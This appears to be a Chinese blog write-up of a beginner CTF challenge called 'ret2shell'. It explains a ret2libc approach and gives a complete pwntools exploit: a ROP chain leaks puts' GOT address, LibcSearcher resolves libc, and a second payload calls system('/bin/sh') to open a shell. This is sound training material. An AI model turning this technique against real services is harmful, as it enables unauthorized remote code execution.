---
title: 赛博协会训练营 - ret2shell 
date: 2023/9/19 12:00:00
updated: 2024/7/25 12:34:56
tags:
    - noob
excerpt: 通过分析`ret2shell`程序，利用ret2libc方法成功实现远程代码执行。
---

from cbctf starter 2023

## 文件分析

下载`ret2shell`, NX off, PIE off, RELRO off  
ghidra分析为64位程序

## 解题思路

> .bss不可执行，且栈溢出的空间不足以放下shellcode，转而考虑**ret2libc**

打完moectf后记：shellcode放的下，但是不太好在栈上执行shellcode  
ret2libc过程参考moectf2023和cbctf的

## EXPLOIT

```python
from pwn import *
import LibcSearcher

sh = remote(???, 10032)
elf = ELF('ret2shell')

putsPlt = elf.plt['puts']
putsGot = elf.got['puts']
popRdiAddr = 0x400703
mainAddr = elf.symbols['main']

# payload 1
sh.sendline(b'x')
sh.sendlineafter(b':', b'0'*0x18 + p64(popRdiAddr) + p64(putsGot) + p64(putsPlt) + p64(mainAddr))

sh.recvuntil(b'\n') # skip
data = sh.recv()
putsGotAddr = u64(data[:6] + b'\0\0')
libc = LibcSearcher.LibcSearcher('puts', putsGotAddr & 0xfff)
libcBase = putsGotAddr - libc.dump('puts')
shstrAddr = libcBase + libc.dump('str_bin_sh')
systemAddr = libcBase + libc.dump('system')
retAddr = 0x400696

# payload 2
sh.sendline(b'x')
sh.sendlineafter(b':', b'0'*0x18 + p64(popRdiAddr) + p64(shstrAddr) + p64(retAddr) + p64(systemAddr))

sh.interactive()
```

Done.
